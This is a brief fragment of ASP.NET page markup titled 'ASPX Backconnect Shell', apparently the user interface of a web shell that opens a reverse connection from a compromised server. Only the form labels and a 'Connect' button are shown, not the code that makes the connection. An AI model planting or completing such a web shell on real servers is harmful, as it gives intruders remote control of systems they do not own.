...
<head runat="server">
    <title>ASPX Backconnect Shell By Hector</title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
    <asp:Label ID="Label10" runat="server" Height="26px" Text="ASPX Backconnect" Width="278px" Font-Bold="True"></asp:Label><br />
    <asp:Label ID="Label5" runat="server" Height="26px" Text="Current Context" Width="278px" Font-Bold="True"></asp:Label><br />
        ...
        <asp:Button ID="butConnectBack" runat="server" OnClick="butConnectBack_Click" Text="Connect"
            Width="302px" /><br />
        <br />
